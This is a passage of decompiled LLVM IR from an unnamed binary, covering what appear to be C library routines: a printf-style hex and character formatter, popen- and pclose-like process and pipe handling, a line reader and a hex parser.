  %v2_8c3c = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8c40 = icmp eq i8 %v2_8c3c, 120
  br i1 %v7_8c40, label %dec_label_pc_8c48, label %dec_label_pc_8c9c

dec_label_pc_8c48:                                ; preds = %dec_label_pc_8c38
  %v1_8c4c = add i32 %stack_var_-32.133, 4
  %v1_8c58 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8c58 = load i32, i32* %v1_8c58, align 4
  %v7_8c84 = call i32 @function_8858(i32 %tmp, i32 %v2_8c58, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8c90 = add i32 %v7_8c84, %stack_var_-40.132
  br label %dec_label_pc_8de4

dec_label_pc_8c9c:                                ; preds = %dec_label_pc_8c38
  %v2_8ca0 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ca4 = icmp eq i8 %v2_8ca0, 88
  br i1 %v7_8ca4, label %dec_label_pc_8cac, label %dec_label_pc_8d00

dec_label_pc_8cac:                                ; preds = %dec_label_pc_8c9c
  %v1_8cb0 = add i32 %stack_var_-32.133, 4
  %v1_8cbc = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8cbc = load i32, i32* %v1_8cbc, align 4
  %v7_8ce8 = call i32 @function_8858(i32 %tmp, i32 %v2_8cbc, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 65)
  %v2_8cf4 = add i32 %v7_8ce8, %stack_var_-40.132
  br label %dec_label_pc_8de4

dec_label_pc_8d00:                                ; preds = %dec_label_pc_8c9c
  %v2_8d04 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8d08 = icmp eq i8 %v2_8d04, 117
  br i1 %v7_8d08, label %dec_label_pc_8d10, label %dec_label_pc_8d64

dec_label_pc_8d10:                                ; preds = %dec_label_pc_8d00
  %v1_8d14 = add i32 %stack_var_-32.133, 4
  %v1_8d20 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8d20 = load i32, i32* %v1_8d20, align 4
  %v7_8d4c = call i32 @function_8858(i32 %tmp, i32 %v2_8d20, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8d58 = add i32 %v7_8d4c, %stack_var_-40.132
  br label %dec_label_pc_8de4

dec_label_pc_8d64:                                ; preds = %dec_label_pc_8d00
  %v2_8d68 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8d6c = icmp eq i8 %v2_8d68, 99
  br i1 %v7_8d6c, label %dec_label_pc_8d74, label %dec_label_pc_8de4

dec_label_pc_8d74:                                ; preds = %dec_label_pc_8d64
  %v1_8d78 = add i32 %stack_var_-32.133, 4
  %v1_8d84 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8d84 = load i32, i32* %v1_8d84, align 4
  %v1_8d88 = urem i32 %v2_8d84, 256
  store i32 %v1_8d88, i32* %stack_var_-18, align 4
  %v6_8dac = call i32 @function_86d4(i32 %tmp, i8* %v5_8dac, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 %v1_8d78)
  %v2_8db8 = add i32 %v6_8dac, %stack_var_-40.132
  br label %dec_label_pc_8de4

dec_label_pc_8dc4:                                ; preds = %dec_label_pc_8a68, %dec_label_pc_8aa4
  %stack_var_-28.2 = phi i8* [ %v5_8a80, %dec_label_pc_8aa4 ], [ %stack_var_-28.435, %dec_label_pc_8a68 ]
  %v2_8dc8 = load i8, i8* %stack_var_-28.2, align 1
  %v3_8dc8 = zext i8 %v2_8dc8 to i32
  %v3_8dd4 = call i32 @function_8668(i32* %arg1, i32 %v3_8dc8)
  %v1_8ddc = add i32 %stack_var_-40.132, 1
  br label %dec_label_pc_8de4

dec_label_pc_8de4:                                ; preds = %dec_label_pc_8d64, %dec_label_pc_8d74, %dec_label_pc_8d10, %dec_label_pc_8cac, %dec_label_pc_8c48, %dec_label_pc_8be4, %dec_label_pc_8ba8, %dec_label_pc_8dc4
  %stack_var_-40.0 = phi i32 [ %v1_8ddc, %dec_label_pc_8dc4 ], [ %v2_8bc8, %dec_label_pc_8ba8 ], [ %v2_8c2c, %dec_label_pc_8be4 ], [ %v2_8c90, %dec_label_pc_8c48 ], [ %v2_8cf4, %dec_label_pc_8cac ], [ %v2_8d58, %dec_label_pc_8d10 ], [ %v2_8db8, %dec_label_pc_8d74 ], [ %stack_var_-40.132, %dec_label_pc_8d64 ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.133, %dec_label_pc_8dc4 ], [ %v1_8b74, %dec_label_pc_8ba8 ], [ %v1_8be8, %dec_label_pc_8be4 ], [ %v1_8c4c, %dec_label_pc_8c48 ], [ %v1_8cb0, %dec_label_pc_8cac ], [ %v1_8d14, %dec_label_pc_8d10 ], [ %v1_8d78, %dec_label_pc_8d74 ], [ %stack_var_-32.133, %dec_label_pc_8d64 ]
  %stack_var_-28.3 = phi i8* [ %stack_var_-28.2, %dec_label_pc_8dc4 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8ba8 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8be4 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c48 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8cac ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8d10 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8d74 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8d64 ]
  %v4_8de4 = ptrtoint i8* %stack_var_-28.3 to i32
  %v1_8de8 = add i32 %v4_8de4, 1
  %stack_var_-28.4 = inttoptr i32 %v1_8de8 to i8*
  %v2_8df4 = load i8, i8* %stack_var_-28.4, align 1
  %v2_8df8 = icmp eq i8 %v2_8df4, 0
  br i1 %v2_8df8, label %dec_label_pc_8e00, label %dec_label_pc_8a68

dec_label_pc_8e00:                                ; preds = %dec_label_pc_8a78, %dec_label_pc_8de4, %dec_label_pc_8a40
  %stack_var_-40.1.lcssa = phi i32 [ 0, %dec_label_pc_8a40 ], [ %stack_var_-40.132, %dec_label_pc_8a78 ], [ %stack_var_-40.0, %dec_label_pc_8de4 ]
  %v2_8e04 = icmp eq i32* %arg1, null
  br i1 %v2_8e04, label %dec_label_pc_8e1c, label %dec_label_pc_8e0c

dec_label_pc_8e0c:                                ; preds = %dec_label_pc_8e00
  %v2_8e10 = load i32, i32* %arg1, align 4
  %v3_8e18 = inttoptr i32 %v2_8e10 to i8*
  store i8 0, i8* %v3_8e18, align 1
  br label %dec_label_pc_8e1c

dec_label_pc_8e1c:                                ; preds = %dec_label_pc_8e00, %dec_label_pc_8e0c
  ret i32 %stack_var_-40.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-28.4, { 1, 0 }
  uselistorder i8* %stack_var_-28.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-28.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-44.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8ae0, { 1, 0 }
  uselistorder i32 %stack_var_-44.0.ph, { 1, 0 }
  uselistorder i8* %v5_8a80, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-40.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-32.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-28.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_8858, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8e1c, { 1, 0 }
  uselistorder label %dec_label_pc_8e00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8de4, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8dc4, { 1, 0 }
  uselistorder label %dec_label_pc_8ba8, { 1, 0 }
  uselistorder label %dec_label_pc_8b60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8b50, { 1, 0 }
  uselistorder label %dec_label_pc_8adc, { 1, 0 }
  uselistorder label %dec_label_pc_8a68, { 1, 0 }
}

define i32 @function_8e30(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10) local_unnamed_addr {
dec_label_pc_8e30:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-12, align 4
  store i32 36416, i32* %stack_var_-20, align 4
  %v2_8e3c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8e3c, i32* @fp, align 4
  %v2_8e44 = ptrtoint i32* %stack_var_-12 to i32
  %v4_8e5c = call i32 @function_8a40(i32* null, i32 %arg1, i32 %v2_8e44)
  ret i32 %v4_8e5c

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8e70(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8e70:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8e78 = load i32, i32* @fp, align 4
  store i32 36480, i32* %stack_var_-16, align 4
  %v2_8e7c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8e7c, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8e88 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8ea0 = call i32 @function_8a40(i32* nonnull %stack_var_-36, i32 %arg2, i32 %v2_8e88)
  store i32 %v3_8e78, i32* @fp, align 4
  ret i32 %v4_8ea0

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_8eb4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8eb4:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8eb8 = load i32, i32* @r2, align 4
  store i32 %v6_8eb8, i32* %stack_var_-8, align 4
  %v3_8ebc = load i32, i32* @fp, align 4
  store i32 36548, i32* %stack_var_-16, align 4
  %v2_8ec0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8ec0, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-48, align 4
  %v1_8ed0 = call i32 @function_127d4(i32 2048)
  store i32 %v1_8ed0, i32* %stack_var_-40, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8eec = inttoptr i32 %v1_8ed0 to i8*
  %v3_8eec = call i32 @function_11d70(i8* %v2_8eec, i32 0)
  %v2_8ef8 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8f18 = call i32 @function_8a40(i32* nonnull %stack_var_-40, i32 %arg2, i32 %v2_8ef8)
  store i32 %v1_8ed0, i32* @r0, align 4
  %v0_8f20 = call i32 @function_11e30()
  %v2_8f30 = add i32 %v0_8f20, %v1_8ed0
  %v3_8f38 = inttoptr i32 %v2_8f30 to i8*
  store i8 10, i8* %v3_8f38, align 1
  store i32 %v1_8ed0, i32* @r0, align 4
  %v0_8f40 = call i32 @function_11e30()
  %v3_8f48 = load i32, i32* %stack_var_-48, align 4
  %v4_8f58 = inttoptr i32 %v1_8ed0 to i32*
  %v5_8f58 = call i32 @function_125ac(i32 %v3_8f48, i32* %v4_8f58, i32 %v0_8f40, i32 16384)
  %v1_8f68 = call i32 @function_12928(i32 %v1_8ed0)
  store i32 %v3_8ebc, i32* @fp, align 4
  ret i32 %v5_8f58

; uselistorder directives
  uselistorder i32 %v1_8ed0, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_8f7c(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_8f7c:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8f80 = load i32, i32* @fp, align 4
  store i32 36744, i32* %stack_var_-4, align 4
  %v2_8f84 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8f84, i32* @fp, align 4
  %v2_8f98 = load i8, i8* %arg2, align 1
  %v7_8f9c = icmp eq i8 %v2_8f98, 114
  br i1 %v7_8f9c, label %dec_label_pc_8fb4, label %dec_label_pc_8fa4

dec_label_pc_8fa4:                                ; preds = %dec_label_pc_8f7c
  %v2_8fa8 = load i8, i8* %arg2, align 1
  %v7_8fac = icmp eq i8 %v2_8fa8, 119
  br i1 %v7_8fac, label %dec_label_pc_8fb4, label %dec_label_pc_8fc8

dec_label_pc_8fb4:                                ; preds = %dec_label_pc_8fa4, %dec_label_pc_8f7c
  %v1_8fb8 = add i32 %tmp, 1
  %v1_8fbc = inttoptr i32 %v1_8fb8 to i8*
  %v2_8fbc = load i8, i8* %v1_8fbc, align 1
  %v2_8fc0 = icmp eq i8 %v2_8fbc, 0
  br i1 %v2_8fc0, label %dec_label_pc_8fd4, label %dec_label_pc_8fc8

dec_label_pc_8fc8:                                ; preds = %dec_label_pc_8fa4, %dec_label_pc_8fb4
  br label %dec_label_pc_91e4

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fb4
  %v2_8fd4 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8fdc = call i32 @function_10864(i32 %v2_8fd4)
  %v1_8fe4 = icmp slt i32 %v1_8fdc, 0
  br i1 %v1_8fe4, label %dec_label_pc_8fec, label %dec_label_pc_8ff8

dec_label_pc_8fec:                                ; preds = %dec_label_pc_8fd4
  br label %dec_label_pc_91e4

dec_label_pc_8ff8:                                ; preds = %dec_label_pc_8fd4
  %v2_8ffc = load i32, i32* @global_var_245e8.46, align 4
  %v2_9000 = icmp eq i32 %v2_8ffc, 0
  br i1 %v2_9000, label %dec_label_pc_9008, label %dec_label_pc_908c

dec_label_pc_9008:                                ; preds = %dec_label_pc_8ff8
  %v0_9008 = call i32 @function_106fc()
  %v5_901c = icmp sgt i32 %v0_9008, 0
  br i1 %v5_901c, label %dec_label_pc_902c, label %dec_label_pc_9020

dec_label_pc_9020:                                ; preds = %dec_label_pc_9008
  br label %dec_label_pc_91e4

dec_label_pc_902c:                                ; preds = %dec_label_pc_9008
  %v3_9030 = mul i32 %v0_9008, 4
  %v1_9038 = call i32 @function_127d4(i32 %v3_9030)
  store i32 %v1_9038, i32* @global_var_245e8.46, align 4
  %v2_9054 = icmp eq i32 %v1_9038, 0
  br i1 %v2_9054, label %dec_label_pc_905c, label %dec_label_pc_9068

dec_label_pc_905c:                                ; preds = %dec_label_pc_902c
  br label %dec_label_pc_91e4

dec_label_pc_9068:                                ; preds = %dec_label_pc_902c
  store i32 %v3_9030, i32* @r2, align 4
  %v2_9088 = inttoptr i32 %v1_9038 to i8*
  %v3_9088 = call i32 @function_11d70(i8* %v2_9088, i32 0)
  br label %dec_label_pc_908c

dec_label_pc_908c:                                ; preds = %dec_label_pc_8ff8, %dec_label_pc_9068
  %v0_908c = call i32 @function_10530()
  %v7_90a4 = icmp eq i32 %v0_908c, -1
  br i1 %v7_90a4, label %dec_label_pc_90bc, label %dec_label_pc_90ac

dec_label_pc_90ac:                                ; preds = %dec_label_pc_908c
  %v2_90b0 = icmp eq i32 %v0_908c, 0
  %v3_90e4 = load i8, i8* %arg2, align 1
  %v7_90e8 = icmp eq i8 %v3_90e4, 114
  br i1 %v2_90b0, label %dec_label_pc_90e0, label %dec_label_pc_9180

dec_label_pc_90bc:                                ; preds = %dec_label_pc_908c
  %v3_90bc = load i32, i32* %stack_var_-32, align 4
  %v1_90c4 = call i32 @function_10678(i32 %v3_90bc)
  %v1_90d0 = call i32 @function_10678(i32 %tmp3)
  br label %dec_label_pc_91e4

dec_label_pc_90e0:                                ; preds = %dec_label_pc_90ac
  br i1 %v7_90e8, label %dec_label_pc_90f0, label %dec_label_pc_9128

dec_label_pc_90f0:                                ; preds = %dec_label_pc_90e0
  %v7_90f4 = icmp eq i32 %tmp3, 1
  br i1 %v7_90f4, label %dec_label_pc_9118, label %dec_label_pc_90fc

dec_label_pc_90fc:                                ; preds = %dec_label_pc_90f0
  %v4_9108 = call i32 @function_106a4(i32 %tmp3, i32 1, i32 %tmp)
  %v1_9114 = call i32 @function_10678(i32 %tmp3)
  br label %dec_label_pc_9118

dec_label_pc_9118:                                ; preds = %dec_label_pc_90f0, %dec_label_pc_90fc
  %v3_9118 = load i32, i32* %stack_var_-32, align 4
  %v1_9120 = call i32 @function_10678(i32 %v3_9118)
  br label %dec_label_pc_915c

dec_label_pc_9128:                                ; preds = %dec_label_pc_90e0
  %v3_9128 = load i32, i32* %stack_var_-32, align 4
  %v2_912c = icmp eq i32 %v3_9128, 0
  br i1 %v2_912c, label %dec_label_pc_9150, label %dec_label_pc_9134

dec_label_pc_9134:                                ; preds = %dec_label_pc_9128
  %v4_9140 = call i32 @function_106a4(i32 %v3_9128, i32 0, i32 %tmp)
  %v3_9144 = load i32, i32* %stack_var_-32, align 4
  %v1_914c = call i32 @function_10678(i32 %v3_9144)
  br label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_9128, %dec_label_pc_9134
  %v1_9158 = call i32 @function_10678(i32 %tmp3)
  br label %dec_label_pc_915c

dec_label_pc_915c:                                ; preds = %dec_label_pc_9118, %dec_label_pc_9150
  store i32 ptrtoint ([8 x i8]* @global_var_16914.48 to i32), i32* @r0, align 4
  %v8_9174 = call i32 @function_13460(i32 ptrtoint ([8 x i8]* @global_var_16914.48 to i32), i32 ptrtoint ([3 x i8]* @global_var_1691c.50 to i32), i32 ptrtoint ([3 x i8]* @global_var_16920.52 to i32), i32 %arg1, i32 0)
  %v1_917c = call i32 @function_10624(i32 127)
  unreachable

dec_label_pc_9180:                                ; preds = %dec_label_pc_90ac
  br i1 %v7_90e8, label %dec_label_pc_9190, label %dec_label_pc_91a8

dec_label_pc_9190:                                ; preds = %dec_label_pc_9180
  %v3_9190 = load i32, i32* %stack_var_-32, align 4
  %v1_91a0 = call i32 @function_10678(i32 %tmp3)
  br label %dec_label_pc_91bc

dec_label_pc_91a8:                                ; preds = %dec_label_pc_9180
  %v3_91b0 = load i32, i32* %stack_var_-32, align 4
  %v1_91b8 = call i32 @function_10678(i32 %v3_91b0)
  br label %dec_label_pc_91bc

dec_label_pc_91bc:                                ; preds = %dec_label_pc_9190, %dec_label_pc_91a8
  %stack_var_-40.0 = phi i32 [ %v3_9190, %dec_label_pc_9190 ], [ %tmp3, %dec_label_pc_91a8 ]
  %v3_91c0 = mul i32 %stack_var_-40.0, 4
  %v2_91cc = load i32, i32* @global_var_245e8.46, align 4
  %v2_91d0 = add i32 %v2_91cc, %v3_91c0
  %v2_91d8 = inttoptr i32 %v2_91d0 to i32*
  store i32 %v0_908c, i32* %v2_91d8, align 4
  br label %dec_label_pc_91e4

dec_label_pc_91e4:                                ; preds = %dec_label_pc_90bc, %dec_label_pc_905c, %dec_label_pc_9020, %dec_label_pc_8fec, %dec_label_pc_8fc8, %dec_label_pc_91bc
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8fec ], [ -1, %dec_label_pc_905c ], [ -1, %dec_label_pc_90bc ], [ %stack_var_-40.0, %dec_label_pc_91bc ], [ -1, %dec_label_pc_9020 ], [ -1, %dec_label_pc_8fc8 ]
  store i32 %v3_8f80, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_908c, { 1, 2, 0 }
  uselistorder i32 %v3_9030, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_106a4, { 1, 0 }
  uselistorder i8* %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_91e4, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_91bc, { 1, 0 }
  uselistorder label %dec_label_pc_915c, { 1, 0 }
  uselistorder label %dec_label_pc_9150, { 1, 0 }
  uselistorder label %dec_label_pc_9118, { 1, 0 }
  uselistorder label %dec_label_pc_908c, { 1, 0 }
  uselistorder label %dec_label_pc_8fc8, { 1, 0 }
}

define i32 @function_9204(i32 %arg1) local_unnamed_addr {
dec_label_pc_9204:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_9204 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9204, i32* @ip, align 4
  %v2_921c = load i32, i32* @global_var_245e8.46, align 4
  %v2_9220 = icmp eq i32 %v2_921c, 0
  br i1 %v2_9220, label %dec_label_pc_9374, label %dec_label_pc_9228

dec_label_pc_9228:                                ; preds = %dec_label_pc_9204
  %v3_922c = mul i32 %arg1, 4
  %v2_923c = add i32 %v2_921c, %v3_922c
  %v1_9240 = inttoptr i32 %v2_923c to i32*
  %v2_9240 = load i32, i32* %v1_9240, align 4
  %v2_9244 = icmp eq i32 %v2_9240, 0
  br i1 %v2_9244, label %dec_label_pc_9374, label %dec_label_pc_9258

dec_label_pc_9258:                                ; preds = %dec_label_pc_9228
  %v1_925c = call i32 @function_10678(i32 %arg1)
  %v2_9260 = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_9260, i32* @r0, align 4
  %v1_9268 = call i32 @function_12698(i32 %v2_9260)
  store i32 %v2_9260, i32* @r0, align 4
  %v2_9278 = call i32 @function_12668(i32 %v2_9260, i32 2)
  store i32 %v2_9260, i32* @r0, align 4
  %v2_9288 = call i32 @function_12668(i32 %v2_9260, i32 3)
  store i32 %v2_9260, i32* @r0, align 4
  %v2_9298 = call i32 @function_12668(i32 %v2_9260, i32 1)
  %v2_92a0 = ptrtoint i32* %stack_var_-148 to i32
  %v3_92ac = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_92ac = call i32 @function_10918(i32 0, %_TYPEDEF_sigset_t* %v3_92ac, i32 %v2_92a0)
  %v2_92cc = ptrtoint i32* %stack_var_-280 to i32
  br label %dec_label_pc_92b0

dec_label_pc_92b0:                                ; preds = %dec_label_pc_92f4, %dec_label_pc_9258
  %v2_92c0 = load i32, i32* @global_var_245e8.46, align 4
  %v2_92c4 = add i32 %v2_92c0, %v3_922c
  %v1_92c8 = inttoptr i32 %v2_92c4 to i32*
  %v2_92c8 = load i32, i32* %v1_92c8, align 4
  store i32 %v2_92c8, i32* @r0, align 4
  store i32 %v2_92cc, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  %v3_92dc = call i32 @function_10998(i32 %v2_92c8, i32 %v2_92cc, i32 0)
  %v3_92ec = icmp eq i32 %v3_92dc, -1
  %v8_92ec = icmp eq i32 %v3_92dc, -1
  br i1 %v3_92ec, label %dec_label_pc_92f4, label %dec_label_pc_9308

dec_label_pc_92f4:                                ; preds = %dec_label_pc_92b0
  %v0_92f4 = call i32 @function_10a18()
  %v1_92fc = inttoptr i32 %v0_92f4 to i32*
  %v2_92fc = load i32, i32* %v1_92fc, align 4
  %v7_9300 = icmp eq i32 %v2_92fc, 4
  br i1 %v7_9300, label %dec_label_pc_92b0, label %dec_label_pc_9308

dec_label_pc_9308:                                ; preds = %dec_label_pc_92b0, %dec_label_pc_92f4
  %v3_9318 = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_9318 = call i32 @function_10918(i32 2, %_TYPEDEF_sigset_t* %v3_9318, i32 0)
  %v3_9320 = mul i32 %tmp6, 4
  %v2_932c = load i32, i32* @global_var_245e8.46, align 4
  %v2_9330 = add i32 %v2_932c, %v3_9320
  %v2_9338 = inttoptr i32 %v2_9330 to i32*
  store i32 0, i32* %v2_9338, align 4
  br i1 %v8_92ec, label %dec_label_pc_9374, label %dec_label_pc_9348

dec_label_pc_9348:                                ; preds = %dec_label_pc_9308
  %v3_9348 = load i32, i32* %stack_var_-280, align 4
  %v1_9354 = and i32 %v3_9348, 65280
  %v3_93581 = udiv i32 %v1_9354, 256
  br label %dec_label_pc_9374

dec_label_pc_9374:                                ; preds = %dec_label_pc_9348, %dec_label_pc_9308, %dec_label_pc_9204, %dec_label_pc_9228
  %storemerge4 = phi i32 [ -1, %dec_label_pc_9228 ], [ -1, %dec_label_pc_9204 ], [ %v3_93581, %dec_label_pc_9348 ], [ -1, %dec_label_pc_9308 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_92cc, { 1, 0 }
  uselistorder i32 %v2_9260, { 1, 0, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_922c, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_12668, { 2, 1, 0 }
  uselistorder i32* @global_var_245e8.46, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9374, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_9308, { 1, 0 }
}

define i32 @function_9388(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9388:
  br label %dec_label_pc_93f8

dec_label_pc_93b8:                                ; preds = %dec_label_pc_9408
  %v3_93d4 = inttoptr i32 %v2_9414 to i32*
  %v4_93d4 = call i32 @function_10890(i32 %arg3, i32* %v3_93d4, i32 1)
  %v1_93e4 = add nuw i32 %storemerge25, 1
  %v7_93f0 = icmp eq i32 %v4_93d4, 1
  br i1 %v7_93f0, label %dec_label_pc_93f8, label %dec_label_pc_9428

dec_label_pc_93f8:                                ; preds = %dec_label_pc_9388, %dec_label_pc_93b8
  %storemerge25 = phi i32 [ 0, %dec_label_pc_9388 ], [ %v1_93e4, %dec_label_pc_93b8 ]
  %v6_9404 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_9404, label %dec_label_pc_9408, label %dec_label_pc_9428

dec_label_pc_9408:                                ; preds = %dec_label_pc_93f8
  %v2_9414 = add i32 %storemerge25, %arg1
  %v1_9418 = add i32 %v2_9414, -1
  %v1_941c = inttoptr i32 %v1_9418 to i8*
  %v2_941c = load i8, i8* %v1_941c, align 1
  %v7_9420 = icmp eq i8 %v2_941c, 10
  br i1 %v7_9420, label %dec_label_pc_9428, label %dec_label_pc_93b8

dec_label_pc_9428:                                ; preds = %dec_label_pc_9408, %dec_label_pc_93f8, %dec_label_pc_93b8
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_9408 ], [ 1, %dec_label_pc_93f8 ], [ %v4_93d4, %dec_label_pc_93b8 ]
  %v2_942c = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_942c, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_9414, { 1, 0 }
  uselistorder i32 %v4_93d4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_93f8, { 1, 0 }
}

define i32 @function_9458(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9458:
  %v2_94ac4 = load i8, i8* %arg1, align 1
  %v2_94b06 = icmp eq i8 %v2_94ac4, 0
  br i1 %v2_94b06, label %dec_label_pc_94c4, label %dec_label_pc_94b8

dec_label_pc_9478:                                ; preds = %dec_label_pc_94b8
  %v3_947c = mul i32 %stack_var_-20.07, 16
  %v4_9480 = ptrtoint i8* %v3_949c to i32
  %v2_9484 = load i8, i8* %v3_949c, align 1
  %v3_9484 = zext i8 %v2_9484 to i32
  %v4_9490 = mul nuw nsw i32 %v3_9484, 4
  %v5_9490 = add i32 %v4_9490, ptrtoint (i32* @global_var_16924.55 to i32)
  %v6_9490 = inttoptr i32 %v5_9490 to i32*
  %v7_9490 = load i32, i32* %v6_9490, align 4
  %v2_9494 = or i32 %v7_9490, %v3_947c
  %v1_94a0 = add i32 %v4_9480, 1
  %v5_94a4 = inttoptr i32 %v1_94a0 to i8*
  %v2_94ac = load i8, i8* %v5_94a4, align 1
  %v2_94b0 = icmp eq i8 %v2_94ac, 0
  br i1 %v2_94b0, label %dec_label_pc_94c4, label %dec_label_pc_94b8

dec_label_pc_94b8:                                ; preds = %dec_label_pc_9458, %dec_label_pc_9478
  %v3_949c = phi i8* [ %v5_94a4, %dec_label_pc_9478 ], [ %arg1, %dec_label_pc_9458 ]
  %stack_var_-20.07 = phi i32 [ %v2_9494, %dec_label_pc_9478 ], [ 0, %dec_label_pc_9458 ]
  %v1_94bc = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_94bc, label %dec_label_pc_94c4, label %dec_label_pc_9478

dec_label_pc_94c4:                                ; preds = %dec_label_pc_9478, %dec_label_pc_94b8, %dec_label_pc_9458
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_9458 ], [ %v2_9494, %dec_label_pc_9478 ], [ %stack_var_-20.07, %dec_label_pc_94b8 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
